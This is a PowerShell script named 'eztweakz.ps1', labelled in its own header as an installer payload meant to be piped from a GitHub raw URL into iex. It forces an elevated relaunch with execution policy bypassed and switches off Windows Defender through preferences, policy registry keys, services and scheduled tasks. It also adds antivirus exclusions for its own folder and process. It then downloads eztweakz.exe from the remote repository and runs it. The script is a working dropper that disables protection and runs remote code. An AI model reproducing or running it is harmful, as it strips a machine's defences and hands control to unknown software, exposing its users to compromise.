# eztweakz.ps1 -- one-shot installer payload
# usage: powershell -c "irm https://raw.githubusercontent.com/glebrasskazov13-ctrl/q/main/eztweakz.ps1 | iex"
# iex-safe: no param block, no $PSScriptRoot, no exit.

$ErrorActionPreference = 'Continue'
$SelfUrl = 'https://raw.githubusercontent.com/glebrasskazov13-ctrl/q/main/eztweakz.ps1'
$PayUrl  = 'https://raw.githubusercontent.com/glebrasskazov13-ctrl/q/main/eztweakz.exe'
$OutDir  = Join-Path $env:TEMP 'eztweakz'

function Test-Admin {
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    (New-Object Security.Principal.WindowsPrincipal $id).IsInRole(
        [Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not (Test-Admin)) {
    Write-Host '[*] not elevated -- relaunching as admin' -ForegroundColor Yellow
    Start-Process powershell -Verb RunAs -ArgumentList @(
        '-NoProfile','-ExecutionPolicy','Bypass','-c',"irm $SelfUrl | iex"
    ) | Out-Null
    return
}

Write-Host '[*] admin ok' -ForegroundColor Green

# ---------- 1. defense off ----------
Write-Host '[*] disabling real-time / behavior / cloud protection'
$prefs = @{
    DisableRealtimeMonitoring        = $true
    DisableBehaviorMonitoring        = $true
    DisableIOAVProtection            = $true
    DisableScriptScanning            = $true
    DisableArchiveScanning           = $true
    DisableRemovableDriveScanning    = $true
    DisableBlockAtFirstSeen          = $true
    DisableIntrusionPreventionSystem = $true
    DisableCatchupFullScan           = $true
    DisableCatchupQuickScan          = $true
    MAPSReporting                    = 0
    SubmitSamplesConsent             = 2
    LowThreatDefaultAction           = 6
    ModerateThreatDefaultAction      = 6
    HighThreatDefaultAction          = 6
    SevereThreatDefaultAction        = 6
}
foreach ($k in $prefs.Keys) {
    try { Set-MpPreference -ErrorAction Stop @{ $k = $prefs[$k] } }
    catch { Write-Verbose "pref $k -> $($_.Exception.Message)" }
}

$wdp = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender'
if (-not (Test-Path $wdp)) { New-Item -Path $wdp -Force | Out-Null }
New-ItemProperty -Path $wdp -Name 'DisableAntiSpyware' -Value 1 -PropertyType DWord -Force | Out-Null
New-ItemProperty -Path $wdp -Name 'DisableAntiVirus'   -Value 1 -PropertyType DWord -Force | Out-Null

$rtp = "$wdp\Real-Time Protection"
if (-not (Test-Path $rtp)) { New-Item -Path $rtp -Force | Out-Null }
'DisableRealtimeMonitoring','DisableBehaviorMonitoring','DisableOnAccessProtection',
'DisableScanOnRealtimeEnable','DisableIOAVProtection','DisableScriptScanning' | ForEach-Object {
    New-ItemProperty -Path $rtp -Name $_ -Value 1 -PropertyType DWord -Force | Out-Null
}

foreach ($svc in 'WinDefend','WdNisSvc','SecurityHealthService','Sense') {
    try {
        Stop-Service $svc -Force -ErrorAction Stop
        Set-Service  $svc -StartupType Disabled -ErrorAction Stop
        Write-Host "    $svc stopped + disabled"
    } catch { Write-Verbose "$svc -> $($_.Exception.Message)" }
}

try {
    Get-ScheduledTask -TaskPath '\Microsoft\Windows\Windows Defender\' -ErrorAction Stop |
        Disable-ScheduledTask -ErrorAction Stop | Out-Null
} catch { Write-Verbose "sched -> $($_.Exception.Message)" }

# ---------- 2. download ----------
Write-Host "[*] downloading -> $OutDir"
New-Item -ItemType Directory -Path $OutDir -Force | Out-Null
$dest = Join-Path $OutDir 'eztweakz.exe'

try { Add-MpPreference -ExclusionPath    $OutDir -ErrorAction Stop } catch {}
try { Add-MpPreference -ExclusionProcess 'eztweakz.exe' -ErrorAction Stop } catch {}

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -Uri $PayUrl -OutFile $dest -UseBasicParsing -TimeoutSec 120
if (-not (Test-Path $dest) -or (Get-Item $dest).Length -eq 0) {
    Write-Host "[!] download failed -> $dest" -ForegroundColor Red
    return
}
Write-Host "    $((Get-Item $dest).Length) bytes" -ForegroundColor Green

Unblock-File -Path $dest -ErrorAction SilentlyContinue
Write-Host "    signature: $((Get-AuthenticodeSignature $dest).Status)"

# ---------- 3. run ----------
Write-Host '[*] launching'
$p = Start-Process -FilePath $dest -WorkingDirectory $OutDir -PassThru
Write-Host "    pid $($p.Id)"
